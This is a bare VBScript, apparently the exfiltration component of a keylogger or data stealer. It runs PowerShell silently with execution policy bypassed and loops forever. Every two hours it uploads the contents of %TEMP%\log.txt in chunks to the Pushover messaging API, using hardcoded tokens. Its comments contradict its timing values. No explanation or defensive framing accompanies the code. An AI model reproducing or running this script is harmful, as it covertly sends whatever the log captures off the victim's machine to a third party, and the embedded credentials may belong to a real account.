Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Define the TEMP folder path
tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
logFile = tempPath & "\log.txt"

' Create log.txt if it does not exist
If Not objFSO.FileExists(logFile) Then
    Set objFile = objFSO.CreateTextFile(logFile, True)
    objFile.WriteLine "Log file created on: " & Now
    objFile.Close
End If

' Define the PowerShell script for API execution
psCommand = "powershell -ExecutionPolicy Bypass -NoProfile -Command " & _
    "$API_TOKEN='aw4tthbiwn2sg69hq912j193iair43'; " & _
    "$USER_KEY='u2m1rdameavmjmg6abkauqy6ejdqk7'; " & _
    "$FILE_PATH=[System.IO.Path]::Combine($env:TEMP,'log.txt'); " & _
    "if (-Not (Test-Path $FILE_PATH)) {exit}; " & _
    "$MESSAGE = Get-Content $FILE_PATH -Raw; " & _
    "$MAX_LENGTH = 1024; " & _
    "while ($MESSAGE.Length -gt 0) { " & _
    "$CHUNK = $MESSAGE.Substring(0, [Math]::Min($MAX_LENGTH, $MESSAGE.Length)); " & _
    "Invoke-RestMethod -Uri 'https://api.pushover.net:443/1/messages.json' " & _
    "-Method Post -Body @{token=$API_TOKEN; user=$USER_KEY; message=$CHUNK}; " & _
    "$MESSAGE = $MESSAGE.Substring($CHUNK.Length)}; exit"

' Infinite loop to execute the PowerShell script every 1 hour
Do
    ' Run the PowerShell command in silent mode
    objShell.Run "cmd /c " & psCommand, 0, True

    ' Sleep for 2 hour (3600000 milliseconds)
    WScript.Sleep 7200000
Loop

